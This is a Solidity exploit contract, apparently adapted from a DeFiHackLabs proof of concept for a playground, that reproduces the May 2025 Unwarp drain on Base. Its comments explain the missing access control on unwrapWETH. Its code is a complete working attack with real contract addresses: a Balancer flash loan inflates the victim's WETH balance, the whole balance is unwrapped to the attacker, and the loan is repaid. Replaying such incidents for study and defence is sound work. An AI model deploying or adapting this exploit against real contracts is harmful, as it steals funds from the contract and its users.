// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

// Synthetic standalone exploit for the EVM Playground (2025-05-Unwarp).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry `Unwarp`
// test contract (`address(this)` is the attacker; the Balancer flash-loan
// callback `receiveFlashLoan` lives on the test itself, and profit is kept
// as native ETH sitting on the test contract's own balance -- there is no
// separate exploit contract or forwarding step). This file copies that
// structure verbatim: an entrypoint `run()` that takes the Balancer flash
// loan, and the `receiveFlashLoan` callback that inflates then drains the
// vulnerable contract's own WETH balance.
//
// Root cause (Unwarp / Base, ~$9K, May 2025): the vulnerable contract
// (TransparentUpgradeableProxy 0x8bEfC1d9...4802, delegatecalling into
// unverified logic 0xd971fD39...f131) exposes a PERMISSIONLESS
// `unwrapWETH(uint256 amount, address recipient)`. It unwraps the
// contract's OWN WETH balance (`WETH.balanceOf(address(this))`) via
// `WETH.withdraw(amount)` and forwards the resulting native ETH to an
// arbitrary caller-supplied `recipient` -- no access control, no per-caller
// balance accounting. The attacker uses a zero-fee Balancer flash loan
// purely as a balance amplifier: transfer borrowed WETH into the contract to
// inflate its balance, then unwrap the WHOLE inflated balance to themselves,
// then re-wrap and repay the borrowed portion. The net profit equals exactly
// the contract's own pre-existing WETH balance (~3.98 WETH), converted to ETH.

interface IWETH {
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address dst, uint256 wad) external returns (bool);
    function deposit() external payable;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

// Entry point: plays the role of the DeFiHackLabs `Unwarp` test contract
// (attacker EOA equivalent). Every step below is copied verbatim from
// test/Unwarp_exp.sol.
contract UnwarpDrain {
    IWETH private constant WETH = IWETH(payable(0x4200000000000000000000000000000000000006));
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address A = 0x8bEfC1d90d03011a7d0b35B3a00eC50f8E014802;

    // step 0: approve the vault, then take the flash loan. Everything from
    // here runs inside the recorded receiveFlashLoan callback.
    function run() external {
        IWETH(WETH).approve(address(vault), type(uint256).max);
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100852657473363426325;
        bytes memory encodedata = abi.encode(address(this));

        vault.flashLoan(address(this), assets, amounts, encodedata);
    }

    // Balancer flash-loan callback -- runs the full attack sequence.
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // 1. Inflate the vulnerable contract's own WETH balance by dumping
        // the entire flash-borrowed amount straight into it.
        WETH.transfer(address(A), 100852657473363426325);
        // 2. Call the permissionless unwrapWETH() -- it unwraps A's OWN
        // (now-inflated) WETH balance and forwards the ETH to `this`.
        address(A).call(abi.encodeWithSignature("unwrapWETH(uint256,address)", 104833984375000000000, address(this)));
        // 3. Re-wrap the borrowed portion and repay the flash loan.
        WETH.deposit{value: 100852657473363426325}();
        WETH.transfer(address(vault), 100852657473363426325);
    }

    // Receives the unwrapped native ETH from the vulnerable contract's
    // unwrapWETH() call, and any leftover dust.
    fallback() external payable {}
    receive() external payable {}
}
